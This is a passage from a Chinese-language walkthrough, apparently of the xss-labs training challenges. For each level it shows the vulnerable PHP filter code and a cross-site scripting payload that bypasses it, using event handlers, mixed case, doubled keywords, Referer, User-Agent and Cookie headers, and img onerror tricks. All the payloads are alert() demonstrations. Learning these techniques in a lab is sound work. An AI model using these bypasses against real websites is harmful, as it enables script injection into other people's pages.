language-php"><code class="language-php"><span class="token string">'onfocus=javascript:alert('</span>xss'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用之后，当使用鼠标点击该输入框时输入框被选中可以。</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><h2 id="尝试：-1"><a href="#尝试：-1" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/4.png" class><p>在level4.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#将变量中的>删除</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将变量中的&lt;删除</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不能使用带有&lt;或&gt;,还是可以使用第三关的题解。</p><h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token string">'onfocus=javascript:alert('</span>xss'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用之后，当使用鼠标点击该输入框时输入框被选中可以。</p><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><h2 id="尝试1："><a href="#尝试1：" class="headerlink" title="尝试1："></a>尝试1：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/5.png" class><h2 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h2><pre class="line-numbers language-php"><code class="language-php">onfocus<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现也未成功，查看一下源码：</p><img src="/posts/84ce/5_2.png" class><p>在level5.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将值进行全小写的转换，然后赋值给str变量。</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过str_replace()函数来破坏变量值中的敏感字符的语义。</p><p>不能用带有script和on的payload</p><h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup">&lt;a href=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><h2 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="尝试2-1"><a href="#尝试2-1" class="headerlink" title="尝试2"></a>尝试2</h2><pre class="line-numbers language-php"><code class="language-php">onfocus<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="尝试3"><a href="#尝试3" class="headerlink" title="尝试3"></a>尝试3</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup">&lt;a href=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码，错误原因和level 5一样</p><p>在level6.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不能使用以上字符，但没转化成小写，因此可以利用大小写混写来绕过</p><h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup">&lt;a HrEf=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他的大小写混写一样也可以</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><h2 id="尝试：-2"><a href="#尝试：-2" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源码：</p><img src="/posts/84ce/7.png" class><p>尝试其他的语句，也是出现这种情况</p><p>在level7.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token shell-comment comment">#将参数值转换成小写</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token shell-comment comment">#将基本的关键词都删掉</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时可使用双写关键字，</p><h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"oonnfocus<span class="token operator">=</span>javascriscriptpt<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实就是只要关键字”on” “script”等包含在那个里面，它删掉一个之后，还会保留一个，就可以实现绕过</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><h2 id="尝试1：-1"><a href="#尝试1：-1" class="headerlink" title="尝试1："></a>尝试1：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网页源码为：</p><img src="/posts/84ce/8.png" class><h2 id="尝试2-2"><a href="#尝试2-2" class="headerlink" title="尝试2:"></a>尝试2:</h2><pre class="line-numbers language-php"><code class="language-php">javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源码发现破坏了语义：</p><img src="/posts/84ce/8_2.png" class><p>在level8.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment">#将参数值转换成小写</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h2><p>将unicode编码转换成ASCII码，即将javascript:alert(‘xss’)转换成ASCII码即可</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><h2 id="尝试：-3"><a href="#尝试：-3" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源代码，推测要按照他的某个格式来</p><img src="/posts/84ce/9.png" class><p>在leve9.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'))   #判断如果字符中没有http://的话就会返回false，</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h2><p>跟level 8差不多，先将unicode编码转换成ASCII码，即将javascript:alert(‘xss’)转换成ASCII码，再在后面加一个真正的网址，如//<a href="http://www.baidu.com/">http://www.baidu.com</a>  </p><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><h2 id="尝试：-4"><a href="#尝试：-4" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有三个隐藏的表单</p><img src="/posts/84ce/10.png" class><p>分别测试，发现只有t-sort可以写进值（在f12下调试，将表单的type=”hidden”改成type=”text”，再给value取值)</p><h2 id="payload-9"><a href="#payload-9" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>t_sort<span class="token operator">=</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前面的keyword的值不重要，后面的t_sort等于后面的”是闭合value的”</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中:</p><img src="/posts/84ce/10_2.png" class><h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><h2 id="尝试：-5"><a href="#尝试：-5" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/11.png" class><p>和level10差不多，原来t_sort仍然是接受参数值的，但是里面的双引号加了htmlspecialchars()函数被编码了。</p><p>在leve11.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#在服务器端将请求头中的referer头的值赋给了str11这个变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么就可以利用这个请求头来绕过。</p><h2 id="payload-10"><a href="#payload-10" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包，发现没有referer这个请求头，可以加上，然后发现我们添加的referer头的值出现在了t_ref标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">referer<span class="token punctuation">:</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/11_2.png" class><p>添加完成之后，点击发送即可。</p><h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中：</p><img src="/posts/84ce/11_3.png" class><h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><h2 id="尝试：-6"><a href="#尝试：-6" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/12.png" class><p>和level11差不多，在level 12中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将请求中User-Agent头的值赋给了变量str11</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以利用这个请求头来绕过。</p><h2 id="payload-11"><a href="#payload-11" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-2"><a href="#方法一：-2" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包,发现我们添加的User-Agent头的值出现在了t_ua标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">User<span class="token operator">-</span>Agent<span class="token punctuation">:</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/12_2.png" class><h3 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中：</p><img src="/posts/84ce/12_3.png" class><h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><h2 id="尝试：-7"><a href="#尝试：-7" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/13.png" class><p>和level12差不多，在level 13中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#将请求中cookie的值赋给了变量str11</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用cookie来绕过。</p><h2 id="payload-12"><a href="#payload-12" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-3"><a href="#方法一：-3" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包,发现我们添加的cookie的值出现在了t_cook标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">Cookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/13_2.png" class><h3 id="方法二：-3"><a href="#方法二：-3" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中</p><img src="/posts/84ce/13_3.png" class><h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><p>本关因iframe调用的文件地址失效，无法进行测试。</p><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><p>在level15.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;body>&lt;span class="ng-include:'</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'">&lt;/span>&lt;/body>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们提交的参数src的值被插入到了<span>标签的class属性值中，但是前面还有ng-include这样的字符。</span></p><p><strong>ng-include</strong>是angular js中的东西，ng-include指令用于包含外部的HTML文件。</p><h2 id="payload-13"><a href="#payload-13" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(1)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php">src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(/xss/)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在img标签中，当src指向一个不明确的地址时，会执行onerror的语句。</p><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>在level16.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明不能使用大小写绕过，将”script”,” “,”/“替换成了&amp;nbsp</p><h2 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h2><p>使用一个不需要闭合的标签，且可以用回车(回车用%a来表示)来将它们分开,构造语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup">&lt;img%0asrc=1%0aonerror=alert(‘xss’)></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><p>level17到level20因为一些浏览器的原因，无法显示图片</p><p>但其原理如下：</p><h2 id="payload-14"><a href="#payload-14" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span> onmousemove<span class="token operator">&amp;</span>arg02<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>xss<span class="token operator">/</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span> onmousemove<span class="token operator">=</span><span class="token string">"alert(/xss/)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span> onclick<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" 